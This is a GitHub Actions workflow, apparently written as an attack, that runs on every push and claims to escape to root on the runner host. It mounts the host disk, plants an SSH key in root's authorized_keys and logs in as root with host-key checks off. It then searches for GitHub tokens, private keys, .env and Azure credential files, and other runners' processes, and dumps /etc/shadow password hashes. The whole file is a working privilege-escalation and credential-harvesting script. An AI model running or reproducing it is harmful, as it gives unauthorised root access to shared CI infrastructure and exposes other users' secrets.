name: github-privesc-to-root
run-name: Privilege Escalation to ROOT
on: [push]
jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - name: Escalate to ROOT on host
        run: |
          # Mount host filesystem
          sudo mkdir -p /mnt/host
          sudo mount /dev/sda1 /mnt/host
          
          # Generate SSH key
          ssh-keygen -t ed25519 -f /tmp/root_key -N ""
          
          # Inject SSH key into ROOT user
          sudo mkdir -p /mnt/host/root/.ssh
          sudo cp /tmp/root_key.pub /mnt/host/root/.ssh/authorized_keys
          sudo chown -R 0:0 /mnt/host/root/.ssh
          sudo chmod 700 /mnt/host/root/.ssh
          sudo chmod 600 /mnt/host/root/.ssh/authorized_keys
          
          # Get host IP
          HOST_IP=$(hostname -I | awk '{print $1}')
          
          # SSH as ROOT and find impact
          ssh -i /tmp/root_key -o StrictHostKeyChecking=no -T root@$HOST_IP << 'EOF'
          echo "=== CONTAINER ESCAPE SUCCESSFUL - ROOT ON HOST ==="
          whoami
          hostname
          id
          uname -a
          echo ""
          
          echo "=== SEARCHING FOR SENSITIVE DATA ==="
          
          # Find all workflow runs
          echo "--- Workflow Directories ---"
          find /home/runner/_work -type d -maxdepth 3 2>/dev/null | head -20
          
          # Find secrets and tokens
          echo "--- Searching for GitHub Tokens ---"
          grep -r "ghp_\|ghs_\|github_pat_" /home/runner/_work 2>/dev/null | head -10 || echo "No tokens found in grep"
          
          # Find credential files
          echo "--- Credential Files ---"
          find /home/runner -name "*.key" -o -name "*.pem" -o -name ".env" -o -name "*secret*" 2>/dev/null | head -20
          
          # Check Docker
          echo "--- Docker Status ---"
          docker ps -a
          docker images | head -10
          
          # Find all users
          echo "--- System Users ---"
          cat /etc/passwd | grep -v "nologin\|false" | tail -10
          
          # Check for other workflows running
          echo "--- Running Processes (Other Workflows) ---"
          ps aux | grep -E "Runner.Listener|Runner.Worker" | grep -v grep | head -10
          
          # Find Azure credentials
          echo "--- Azure/Cloud Credentials ---"
          find /home -name "*azure*" -o -name "*credentials*" 2>/dev/null | head -10
          
          # Check environment variables in runner
          echo "--- Runner Environment Files ---"
          find /home/runner -name ".env*" -o -name "*.env" 2>/dev/null
          
          # Check systemd for GitHub Actions services
          echo "--- GitHub Actions Services ---"
          systemctl list-units --type=service | grep -i "runner\|github\|actions" || echo "No service units found"
          
          # Check /tmp for secrets
          echo "--- Temporary Secrets ---"
          ls -la /tmp/*.key /tmp/*.pem /tmp/*token* 2>/dev/null || echo "No temp secrets"
          
          # Get shadow file (password hashes)
          echo "--- System Shadow File ---"
          cat /etc/shadow | head -5
          
          # Check system info
          echo "--- System Info ---"
          lsblk
          df -h | head -10
          EOF
